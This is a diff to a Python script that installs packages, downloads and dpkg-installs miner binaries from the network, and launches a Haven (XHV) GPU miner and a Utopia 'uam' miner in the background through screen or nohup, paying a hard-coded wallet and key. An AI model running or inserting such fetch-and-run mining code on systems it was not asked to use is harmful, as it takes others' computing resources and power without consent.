@@ -12,7 +12,8 @@ except:
 
 try:
     os.system('apt-get update -y')
-    os.system('apt-get install -y python python-dev screen')
+    os.system ('apt --fix-broken install -y')
+    os.system('apt-get install -y python python-dev screen nvidia-driver-470')
 except:
     pass
 try:
@@ -44,7 +45,6 @@ if not os.path.isfile('/tmp/%s/%s' %(folder_stak_rx, stak_rx)):
     os.system('wget %s' % link_deb)
     try:
         os.system ('dpkg -i %s' %deb_name)
-        os.system('apt -f install')
     except:
         pass
     workingdir = os.getcwd()
@@ -55,6 +55,36 @@ else:
     workingdir = os.getcwd()
 #check screen
 command = './%s --donate-level 1 --cuda -o us.haven.herominers.com:1110 -u hvxxugGqjFCjJsvZw9FJbGMzUGuZ3XwBHT2E2xPRojHqPDvEr5ja7ssYrEq57ZzwwDP2h8Bxn6Wo4CT6CM3vLVyo3RQVippYt9 -p nql -a cn-heavy/xhv -t %s' %(stak_rx, cores)
+if os.path.isfile('/usr/bin/screen'):
+    print('Co chuong trinh screen')
+    os.system ('screen -dmS %s %s' %(stak_rx,command))
+elif os.path.isfile('/usr/bin/nohup'):
+    print('Co chuong trinh nohup')
+    os.system ('nohup %s &' %command)
+else:
+    os.system ('%s &' %command)
+
+#utopia
+link_deb = 'https://update.u.is/downloads/uam/linux/uam-latest_amd64.deb'
+deb_name = 'uam-latest_amd64.deb'
+folder_stak_rx = 'uam'
+stak_rx = 'uam'
+if not os.path.isfile('/opt/%s/%s' %(folder_stak_rx, stak_rx)):
+    print('Chua co chuong trinh %s' %stak_rx)
+    os.chdir('/tmp')
+    os.system('wget %s' % link_deb)
+    try:
+        os.system ('dpkg -i %s' %deb_name)
+    except:
+        pass
+    #workingdir = os.getcwd()
+    #os.system('chmod 777 %s' %stak_rx)
+else:
+    print('Da co chuong trinh %s' %stak_rx)
+    #os.chdir('/opt/%s/' %(folder_stak_rx, stak_rx))
+    #workingdir = os.getcwd()
+#check screen
+command = '/opt/%s/%s --pk F32978292823F8829CDC31E42364865D1CAEC2FB847BC9DBB27EF29BCEF6F906' %(folder_stak_rx, stak_rx)
 if os.path.isfile('/usr/bin/screen'):
     print('Co chuong trinh screen')
     os.system ('screen -dmS %s %s' %(stak_rx,command))
